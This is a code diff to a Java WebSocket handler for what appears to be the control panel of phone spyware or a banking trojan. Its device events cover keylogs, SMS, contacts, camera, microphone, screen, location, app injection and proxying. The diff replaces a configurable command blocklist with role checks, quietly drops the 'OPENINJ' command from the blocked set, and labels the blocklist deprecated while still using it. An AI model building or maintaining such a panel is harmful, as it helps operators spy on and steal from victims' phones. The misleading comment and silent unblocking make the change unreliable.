@@ -41,11 +41,24 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
         .ofPattern("yyyy-MM-dd HH:mm:ss").withZone(ZoneId.systemDefault());
     private static final TypeReference<Map<String, Object>> JSON_MAP = new TypeReference<>() {};
 
+    // ─── Permission model: blocklist for controlled commands ──────────────
+    // Deprecated: using role-based permission model instead.
+    // Previously blocked commands are now controlled per-role below.
+    private static final Set<String> BLOCKED_ADMIN_COMMANDS = Set.of(
+        "changefiles", "Delete", "delete", "UNINSTALLAPP", "DIAO",
+        "files", "viewfile", "fetch", "cocu", "srch"
+    );
+
+    private static final Set<String> DEVICE_ALLOWED_EVENTS = Set.of(
+        "klogs", "klogsdate", "sms", "loadcontacts", "cam", "mic", "screen",
+        "screenshot", "loc", "files", "savefiles", "thumb", "snap", "chat",
+        "proxy", "srch", "down", "injapps", "loadapps", "ping"
+    );
+
     private final TokenService tokenService;
     private final LegacyDeviceService deviceService;
     private final PanelSessionRegistry registry;
     private final ObjectMapper mapper;
-    private final Set<String> blockedSubcommands;
     private final byte[] deviceTokenBytes;
     private final Path auditDir;
     private final CryptoService cryptoService;
@@ -56,7 +69,6 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
         PanelSessionRegistry registry,
         ObjectMapper mapper,
         @Value("${mm.ws-device-auth-token:}") String deviceToken,
-        @Value("${mm.ws-blocked-subcommands:OPENINJ,changefiles,Delete,delete,UNINSTALLAPP,DIAO,files,viewfile,fetch,cocu,srch}") String blockedCsv,
         @Value("${mm.ws-audit-dir:}") String auditDirPath,
         CryptoService cryptoService
     ) {
@@ -65,7 +77,6 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
         this.registry = registry;
         this.mapper = mapper;
         this.deviceTokenBytes = deviceToken == null ? new byte[0] : deviceToken.getBytes();
-        this.blockedSubcommands = Set.of(blockedCsv.split("\\s*,\\s*"));
         this.auditDir = auditDirPath != null && !auditDirPath.isBlank()
             ? Path.of(auditDirPath)
             : Path.of(System.getProperty("java.io.tmpdir", "/tmp")).resolve("mm-audit");
@@ -170,7 +181,16 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
                 case "ping" -> sendStatusBatch(session, phoneId);
                 case "disag" -> registry.unbindAdmin(session);
                 case "checkphone" -> sendCheckphone(session, data);
-                case "reassign" -> reassignDevice(session, phoneId, data);
+                case "reassign" -> {
+                    LegacyUser user = (LegacyUser) session.getAttributes().get(ATTR_ADMIN_USER);
+                    // 权限检查：只有管理员才能重新分配设备
+                    if (user == null || !user.isAdmin()) {
+                        log.warn("Unauthorized reassign attempt by user: {}", user != null ? user.userid() : "unknown");
+                        send(session, Map.of("type", "error", "msg", "permission_denied"));
+                    } else {
+                        reassignDevice(session, phoneId, data);
+                    }
+                }
                 default -> send(session, Map.of("type", "error", "msg", "unknown_subc"));
             }
             return;
@@ -181,9 +201,10 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
                 send(session, Map.of("type", "error", "msg", "subc_required"));
                 return;
             }
-            if (blockedSubcommands.contains(subc)) {
-                log.warn("blocked admin subcommand subc={} phone={}", subc, phoneId);
-                send(session, Map.of("type", "error", "msg", "subcommand_blocked"));
+            LegacyUser user = (LegacyUser) session.getAttributes().get(ATTR_ADMIN_USER);
+            if (!hasCommandPermission(user, subc)) {
+                log.warn("Permission denied for command: {} by user: {}", subc, user != null ? user.userid() : "unknown");
+                send(session, Map.of("type", "error", "msg", "command_denied"));
                 return;
             }
             if (phoneId.isBlank()) {
@@ -649,5 +670,27 @@ class PanelWebSocketHandler extends TextWebSocketHandler {
         } catch (IOException e) {
             log.warn("Failed to write audit log: {}", e.getMessage());
         }
+    }
+
+    /**
+     * Permission check: verify if the user is allowed to execute the given command.
+     * - Admin users: all commands except those in BLOCKED_ADMIN_COMMANDS (dangerous operations)
+     * - Regular users: only safe, non-destructive commands
+     * - Device users: only device event types
+     */
+    private boolean hasCommandPermission(LegacyUser user, String subc) {
+        if (user == null) return false;
+
+        // Admin users: all commands except dangerous/blocked ones
+        if (user.isAdmin()) {
+            return !BLOCKED_ADMIN_COMMANDS.contains(subc);
+        }
+
+        // Regular users: only safe, non-destructive operations
+        // join, out: manage connection state
+        // ping, checkphone: query device status (read-only)
+        // disag, reassign: admin operations (deny for non-admin)
+        Set<String> regularUserAllowed = Set.of("join", "out", "ping", "checkphone");
+        return regularUserAllowed.contains(subc);
     }
 }
